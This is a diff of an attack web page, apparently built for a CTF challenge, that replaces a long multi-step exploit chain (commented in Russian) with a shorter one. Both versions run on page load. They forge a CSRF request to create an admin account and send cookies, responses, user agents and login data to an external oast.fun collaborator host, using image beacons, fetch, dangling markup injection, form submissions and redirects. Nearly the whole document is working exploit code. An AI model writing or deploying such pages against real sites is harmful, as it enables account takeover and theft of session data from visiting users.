@@ -2,251 +2,48 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Totally Legit Page</title>
+    <title>Malicious Page</title>
 </head>
 <body>
-    <h1>Cool Stuff Here!</h1>
-
     <script>
-        // ==============================================
-        // КОНФИГУРАЦИЯ
-        // ==============================================
-        const COLLABORATOR = 'zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
-        const TARGET_URL = 'http://tasks.goidactf.ru:XXXX'; // УКАЖИ ПОРТ
-        
-        const timestamp = Date.now();
-        const randomPart = Math.random().toString(36).substring(2, 8);
-        const newAdminLogin = `pwned_${timestamp}_${randomPart}`;
+        function createAdminAndExfil() {
+            const new_admin_login = 'hacker_admin';  // Choose your desired login
+            const params = new URLSearchParams({ new_admin_login: new_admin_login });
+            const targetUrl = 'https://tasks.goidactf.ru:20431/create_admin';
+            const webhookUrl = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/log';  // Replace with your actual webhook URL (e.g., from requestbin.com or your server)
 
-        // ==============================================
-        // УЛУЧШЕННАЯ ЭКСФИЛЬТРАЦИЯ (только HTTP, без DNS)
-        // ==============================================
-        function exfil(data) {
-            // Метод 1: Image beacon (HTTP)
-            const params = new URLSearchParams(data).toString();
-            const img = new Image();
-            img.src = `https://${COLLABORATOR}/leak?${params}`;
-            
-            // Метод 2: Fetch (на случай если Image не сработает)
-            fetch(`https://${COLLABORATOR}/leak2`, {
+            fetch(targetUrl, {
                 method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            }).catch(() => {});
-        }
-
-        // ==============================================
-        // ШАГ 1: СОЗДАЁМ АДМИНА
-        // ==============================================
-        function createAdmin() {
-            console.log('[*] Creating admin via CSRF');
-            
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = `${TARGET_URL}/create_admin`;
-            form.target = 'csrf_iframe';
-            
-            const input = document.createElement('input');
-            input.name = 'new_admin_login';
-            input.value = newAdminLogin;
-            form.appendChild(input);
-            
-            const iframe = document.createElement('iframe');
-            iframe.name = 'csrf_iframe';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            document.body.appendChild(form);
-            form.submit();
-            
-            exfil({
-                step: '1_csrf_sent',
-                login: newAdminLogin
-            });
-        }
-
-        // ==============================================
-        // ШАГ 2: ЗАСТАВЛЯЕМ БОТА ЗАЙТИ НА /admin
-        // ==============================================
-        function visitAdminPage() {
-            console.log('[*] Opening /admin in iframe to trigger cookie usage');
-            
-            // Открываем /admin в iframe - бот использует свою cookie
-            const iframe = document.createElement('iframe');
-            iframe.src = `${TARGET_URL}/admin`;
-            iframe.name = 'admin_frame';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            exfil({
-                step: '2_admin_visited',
-                login: newAdminLogin
-            });
-        }
-
-        // ==============================================
-        // ШАГ 3: ЗАСТАВЛЯЕМ БОТА ОТПРАВИТЬ НАМ СВОЮ COOKIE
-        // ==============================================
-        function exfilCookie() {
-            console.log('[*] Attempting cookie exfiltration');
-            
-            // МЕТОД A: Пытаемся прочитать cookie напрямую (не сработает если HttpOnly)
-            const localCookie = document.cookie;
-            if (localCookie) {
-                exfil({
-                    step: '3a_cookie_readable',
-                    cookie: localCookie,
-                    login: newAdminLogin
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: params.toString(),
+                credentials: 'include'
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed with status: ' + response.status);
+                }
+                return response.text();
+            })
+            .then(text => {
+                // Exfiltrate the response to your webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    body: text
                 });
-            }
-            
-            // МЕТОД B: Создаём HTML с Meta Refresh который отправит бота на наш сервер
-            // Бот при переходе отправит Referer и возможно Cookie
-            const exfilPage = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <meta http-equiv="refresh" content="0;url=https://${COLLABORATOR}/cookie_leak?from=${newAdminLogin}">
-                </head>
-                <body>
-                    <script>
-                        // Пытаемся отправить cookie
-                        fetch('https://${COLLABORATOR}/js_cookie', {
-                            method: 'POST',
-                            mode: 'no-cors',
-                            body: JSON.stringify({
-                                cookie: document.cookie,
-                                login: '${newAdminLogin}'
-                            })
-                        });
-                    </script>
-                </body>
-                </html>
-            `;
-            
-            // МЕТОД C: Создаём iframe который выполнит fetch запрос на наш сервер
-            setTimeout(() => {
-                const img = new Image();
-                img.src = `https://${COLLABORATOR}/ping?login=${newAdminLogin}&cookie=${encodeURIComponent(document.cookie || 'none')}`;
-            }, 1000);
-        }
-
-        // ==============================================
-        // ШАГ 4: ПОПЫТКА УКРАСТЬ ЧЕРЕЗ DANGLING MARKUP
-        // ==============================================
-        function tryDanglingMarkup() {
-            console.log('[*] Trying dangling markup injection');
-            
-            // Если в ответе сервера есть наш логин без экранирования,
-            // можем попробовать украсть HTML который идёт после
-            const payload = `hacked<img src='https://${COLLABORATOR}/dangling?data=`;
-            
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = `${TARGET_URL}/create_admin`;
-            form.target = '_blank';
-            
-            const input = document.createElement('input');
-            input.name = 'new_admin_login';
-            input.value = payload;
-            form.appendChild(input);
-            
-            document.body.appendChild(form);
-            form.submit();
-        }
-
-        // ==============================================
-        // ШАГ 5: ПОПЫТКА ЧЕРЕЗ FORM ACTION НА НАШ СЕРВЕР
-        // ==============================================
-        function tryFormActionLeak() {
-            console.log('[*] Trying form action leak');
-            
-            // После создания админа, форма которая сабмитится к нам
-            setTimeout(() => {
-                const leakForm = document.createElement('form');
-                leakForm.method = 'POST';
-                leakForm.action = `https://${COLLABORATOR}/form_leak`;
-                
-                const cookieInput = document.createElement('input');
-                cookieInput.name = 'cookie';
-                cookieInput.value = document.cookie || 'no_cookie_js_access';
-                leakForm.appendChild(cookieInput);
-                
-                const loginInput = document.createElement('input');
-                loginInput.name = 'login';
-                loginInput.value = newAdminLogin;
-                leakForm.appendChild(loginInput);
-                
-                const uaInput = document.createElement('input');
-                uaInput.name = 'user_agent';
-                uaInput.value = navigator.userAgent;
-                leakForm.appendChild(uaInput);
-                
-                document.body.appendChild(leakForm);
-                leakForm.submit();
-            }, 2000);
-        }
-
-        // ==============================================
-        // ШАГ 6: ПОПЫТКА ЧЕРЕЗ LOCATION.REPLACE
-        // ==============================================
-        function tryLocationRedirect() {
-            console.log('[*] Trying location redirect');
-            
-            // Через 4 секунды редиректим всю страницу на наш сервер
-            // Может помочь если бот следует за редиректами
-            setTimeout(() => {
-                window.location.replace(`https://${COLLABORATOR}/final_redirect?login=${newAdminLogin}`);
-            }, 4000);
-        }
-
-        // ==============================================
-        // ГЛАВНЫЙ ЭКСПЛОЙТ
-        // ==============================================
-        async function runExploit() {
-            console.log('[*] Starting exploit chain');
-            
-            exfil({
-                step: '0_started',
-                login: newAdminLogin,
-                ua: navigator.userAgent,
-                timestamp: new Date().toISOString()
-            });
-            
-            // Шаг 1: Создаём админа
-            createAdmin();
-            
-            // Шаг 2: Заходим на /admin (через 1 сек)
-            setTimeout(() => visitAdminPage(), 1000);
-            
-            // Шаг 3: Пытаемся украсть cookie (через 2 сек)
-            setTimeout(() => exfilCookie(), 2000);
-            
-            // Шаг 4: Dangling markup (через 2.5 сек)
-            setTimeout(() => tryDanglingMarkup(), 2500);
-            
-            // Шаг 5: Form leak (через 3 сек)
-            setTimeout(() => tryFormActionLeak(), 3000);
-            
-            // Шаг 6: Редирект (через 4 сек)
-            setTimeout(() => tryLocationRedirect(), 4000);
-            
-            // Финальная эксфильтрация
-            setTimeout(() => {
-                exfil({
-                    step: 'final',
-                    login: newAdminLogin,
-                    note: 'Check all previous steps',
-                    local_cookie: document.cookie || 'none'
+            })
+            .catch(error => {
+                // Optional: exfil error if needed
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    body: 'Error: ' + error.message
                 });
-            }, 3500);
+            });
         }
 
-        // Автозапуск
-        window.addEventListener('load', () => {
-            setTimeout(runExploit, 300);
-        });
+        // Run automatically when page loads
+        createAdminAndExfil();
     </script>
 </body>
 </html>
